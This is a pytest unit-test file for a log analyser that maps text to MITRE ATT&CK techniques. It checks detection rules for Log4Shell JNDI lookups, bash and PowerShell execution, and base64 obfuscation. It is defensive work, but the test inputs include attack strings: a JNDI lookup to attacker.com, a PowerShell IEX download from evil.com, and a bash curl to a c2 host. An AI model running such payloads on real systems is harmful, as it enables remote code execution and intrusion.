"""Unit tests for the ATT&CK mapping rules and mapper — FR-7."""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from core.agents.attack_mapper.mapper import ATTACKMapper
from core.agents.attack_mapper.rules import COMPILED_RULES
from core.config.settings import Settings


@pytest.fixture
def mock_graph() -> MagicMock:
    graph = MagicMock()
    graph.get_node.return_value = None
    graph.create_node.return_value = "ATTACK-node-001"
    graph.create_edge.return_value = "edge-maps-to-001"
    return graph


@pytest.fixture
def mock_db() -> MagicMock:
    db = MagicMock()
    return db


@pytest.fixture
def mapper(mock_graph, mock_db) -> ATTACKMapper:
    return ATTACKMapper(
        settings=Settings(app_env="testing"),
        graph_client=mock_graph,
        db_client=mock_db,
    )


# ---------------------------------------------------------------------------
# Rule compilation
# ---------------------------------------------------------------------------


class TestCompiledRules:
    def test_all_rules_compiled(self):
        assert len(COMPILED_RULES) > 0

    def test_each_rule_has_required_fields(self):
        for rule in COMPILED_RULES:
            assert rule.technique_id.startswith("T")
            assert len(rule.technique_name) > 0
            assert len(rule.tactic) > 0
            assert 0.0 < rule.confidence <= 1.0

    def test_log4shell_rule_matches_jndi(self):
        rule = next(r for r in COMPILED_RULES if r.rule_name == "log4shell_jndi")
        matched, snippet = rule.matches("${jndi:ldap://attacker.com/a}")
        assert matched is True
        assert snippet is not None

    def test_shell_rule_matches_bash(self):
        rule = next(r for r in COMPILED_RULES if r.rule_name == "shell_execution")
        matched, snippet = rule.matches("/bin/bash -c 'whoami'")
        assert matched is True

    def test_powershell_rule_matches_iex(self):
        rule = next(r for r in COMPILED_RULES if r.rule_name == "powershell_execution")
        matched, _ = rule.matches(
            "IEX(New-Object Net.WebClient).DownloadString('http://evil.com')"
        )
        assert matched is True

    def test_base64_rule_matches_decode(self):
        rule = next(r for r in COMPILED_RULES if r.rule_name == "base64_obfuscation")
        matched, _ = rule.matches("echo aGVsbG8= | base64 decode")
        assert matched is True

    def test_rule_does_not_match_unrelated_text(self):
        rule = next(r for r in COMPILED_RULES if r.rule_name == "dos_impact")
        matched, _ = rule.matches("Everything is working fine")
        assert matched is False

    def test_case_insensitive_matching(self):
        rule = next(r for r in COMPILED_RULES if r.rule_name == "shell_execution")
        matched, _ = rule.matches("/BIN/BASH -c 'id'")
        assert matched is True


# ---------------------------------------------------------------------------
# ATTACKMapper.map_text
# ---------------------------------------------------------------------------


class TestMapText:
    def test_returns_empty_for_empty_text(self, mapper):
        results = mapper.map_text("", "EV-001")
        assert results == []

    def test_returns_empty_for_whitespace(self, mapper):
        results = mapper.map_text("   \n\t  ", "EV-001")
        assert results == []

    def test_detects_log4shell(self, mapper):
        text = "WARN com.example.App - Request contains ${jndi:ldap://attacker.com/x}"
        results = mapper.map_text(text, "EV-001")
        ids = [r.technique_id for r in results]
        assert "T1190" in ids

    def test_detects_shell_execution(self, mapper):
        text = "Process spawned: /bin/bash -c 'curl http://c2.evil.com'"
        results = mapper.map_text(text, "EV-002")
        ids = [r.technique_id for r in results]
        assert "T1059" in ids

    def test_detects_powershell(self, mapper):
        text = "powershell -enc SQBFAFgA -nop -WindowStyle Hidden"
        results = mapper.map_text(text, "EV-003")
        ids = [r.technique_id for r in results]
        assert "T1059.001" in ids

    def test_no_duplicate_techniques(self, mapper):
        # Text that would match multiple patterns for T1059
        text = "/bin/bash cmd.exe /bin/sh"
        results = mapper.map_text(text, "EV-004")
        ids = [r.technique_id for r in results]
        assert len(ids) == len(set(ids))

    def test_sorted_by_confidence_descending(self, mapper):
        text = (
            "${jndi:ldap://evil.com/x} "
            "/bin/bash "
            "powershell -enc ABC "
            "crontab -l "
            "exfil data"
        )
        results = mapper.map_text(text, "EV-005")
        if len(results) > 1:
            confidences = [r.confidence for r in results]
            assert confidences == sorted(confidences, reverse=True)

    def test_creates_maps_to_edges(self, mapper, mock_graph):
        text = "${jndi:ldap://attacker.com/x}"
        mapper.map_text(text, "EV-001")
        assert mock_graph.create_edge.called

    def test_persists_to_db(self, mapper, mock_db):
        text = "/bin/bash -c 'whoami'"
        mapper.map_text(text, "EV-001")
        assert mock_db.execute.called

    def test_includes_matched_text_in_result(self, mapper):
        text = "${jndi:ldap://attacker.com/x}"
        results = mapper.map_text(text, "EV-001")
        matched_results = [r for r in results if r.technique_id == "T1190"]
        if matched_results:
            assert matched_results[0].matched_text is not None

    def test_session_id_propagated(self, mapper):
        text = "/bin/bash"
        results = mapper.map_text(text, "EV-001", session_id="RS-TEST-SESSION")
        for r in results:
            assert r.session_id == "RS-TEST-SESSION"


# ---------------------------------------------------------------------------
# ATTACKMapper.map_log_file
# ---------------------------------------------------------------------------


class TestMapLogFile:
    def test_maps_log_file(self, mapper, tmp_path):
        log = tmp_path / "test.log"
        log.write_text("/bin/bash -c 'id'\ncrontab -l\n", encoding="utf-8")
        results = mapper.map_log_file(str(log), "EV-001")
        ids = [r.technique_id for r in results]
        assert "T1059" in ids

    def test_handles_missing_file(self, mapper):
        results = mapper.map_log_file("/nonexistent/path.log", "EV-001")
        assert results == []

    def test_respects_max_bytes(self, mapper, tmp_path):
        log = tmp_path / "big.log"
        log.write_bytes(b"x" * 100_000)
        # Should not raise even for large files
        results = mapper.map_log_file(str(log), "EV-001", max_bytes=50_000)
        assert isinstance(results, list)

    def test_handles_graph_and_db_persistence_errors(self, mapper, mock_graph, mock_db):
        mock_graph.create_edge.side_effect = Exception("Neo4j error")
        mock_db.execute.side_effect = Exception("DB error")
        text = "${jndi:ldap://attacker.com/x}"
        # Should succeed and return mapped results even if graph/db write fails
        results = mapper.map_text(text, "EV-001")
        assert len(results) > 0

    def test_map_artifact_with_content(self, mapper):
        results = mapper.map_artifact("EV-001", content="/bin/bash -c 'id'")
        assert len(results) > 0
        assert any(r.technique_id == "T1059" for r in results)

    def test_map_artifact_loads_from_graph_node(self, mapper, mock_graph):
        mock_graph.get_node.return_value = {
            "id": "EV-002",
            "message": "${jndi:ldap://attacker.com/x}",
        }
        results = mapper.map_artifact("EV-002")
        assert len(results) > 0
        assert any(r.technique_id == "T1190" for r in results)

    def test_map_artifact_returns_empty_when_no_text(self, mapper, mock_graph):
        mock_graph.get_node.return_value = None
        results = mapper.map_artifact("EV-003")
        assert results == []

    def test_upsert_technique_node_skips_when_exists(self, mapper, mock_graph):
        mock_graph.get_node.return_value = {"id": "T1190", "name": "Exploit"}
        res = mapper.map_text("${jndi:ldap://a}", "EV-001")
        assert len(res) > 0
        # create_node should not be called because get_node returned existing node
        assert not mock_graph.create_node.called

    def test_exceptions_hierarchy(self):
        from core.agents.attack_mapper.exceptions import (
            ATTACKMapperError,
            MappingError,
            MappingRuleError,
        )

        err1 = MappingRuleError("invalid rule")
        err2 = MappingError("mapping failed")
        assert isinstance(err1, ATTACKMapperError)
        assert isinstance(err2, ATTACKMapperError)
